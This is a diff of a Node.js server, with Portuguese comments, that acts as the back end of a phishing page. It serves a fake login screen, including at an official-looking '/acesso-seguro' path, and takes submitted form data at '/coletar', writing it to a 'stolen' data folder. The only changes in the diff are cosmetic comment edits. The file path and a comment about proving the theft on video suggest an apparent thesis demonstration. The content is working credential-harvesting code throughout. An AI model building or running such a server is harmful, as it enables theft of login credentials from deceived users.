@@ -18,21 +18,21 @@ const fs = require("fs");
 const path = require("path");
 const querystring = require("querystring");
 
-// § Ajuste aqui a pasta onde os dados roubados serão gravados.
+// Ajuste aqui a pasta onde os dados roubados serão gravados.
 const PASTA_DESTINO = "D:\\User\\Documentos\\TCC\\roubados";
 const PORTA = 9000;
 
 // Garante que a pasta de destino exista.
 fs.mkdirSync(PASTA_DESTINO, { recursive: true });
 
-// § Tipos de conteúdo para servir os arquivos estáticos da página falsa.
+// Tipos de conteúdo para servir os arquivos estáticos da página falsa.
 const TIPOS = {
   ".html": "text/html; charset=utf-8",
   ".css": "text/css; charset=utf-8",
   ".js": "text/javascript; charset=utf-8",
 };
 
-// § Monta o conteúdo do arquivo de texto com os dados capturados.
+// Monta o conteúdo do arquivo de texto com os dados capturados.
 function montarTexto(dados) {
   const quando = new Date().toLocaleString("pt-BR");
   const linhas = [
@@ -48,13 +48,13 @@ function montarTexto(dados) {
   return linhas.join("\r\n");
 }
 
-// § Serve um arquivo estático da pasta do projeto (GET).
+// Serve um arquivo estático da pasta do projeto (GET).
 function servirEstatico(req, res) {
   let caminhoRel = decodeURIComponent(req.url.split("?")[0]);
   if (caminhoRel === "/") {
     caminhoRel = "/index.html";
   }
-  // § Caminho com cara de endereço oficial: serve a tela de login.
+  // Caminho com cara de endereço oficial: serve a tela de login.
   if (caminhoRel === "/acesso-seguro" || caminhoRel === "/acesso-seguro/") {
     caminhoRel = "/index.html";
   }
@@ -78,14 +78,14 @@ function servirEstatico(req, res) {
 }
 
 const servidor = http.createServer((req, res) => {
-  // § Recebimento dos dados roubados (POST).
+  // Recebimento dos dados roubados (POST).
   if (req.method === "POST" && req.url === "/coletar") {
     let corpo = "";
     req.on("data", (parte) => {
       corpo += parte;
     });
     req.on("end", () => {
-      // § Dados chegam como application/x-www-form-urlencoded.
+      // Dados chegam como application/x-www-form-urlencoded.
       const dados = querystring.parse(corpo);
       const texto = montarTexto(dados);
 
@@ -95,7 +95,7 @@ const servidor = http.createServer((req, res) => {
 
       console.log("[coletor] Dados gravados em: " + caminho);
 
-      // § Resposta de confirmação (prova, no vídeo, de que o roubo funcionou).
+      // Resposta de confirmação (prova, no vídeo, de que o roubo funcionou).
       res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
       res.end(
         "<!DOCTYPE html><html lang='pt-BR'><head><meta charset='utf-8'>" +
@@ -116,7 +116,7 @@ const servidor = http.createServer((req, res) => {
     return;
   }
 
-  // § Qualquer outra requisição GET serve a página falsa.
+  // Qualquer outra requisição GET serve a página falsa.
   if (req.method === "GET") {
     servirEstatico(req, res);
     return;
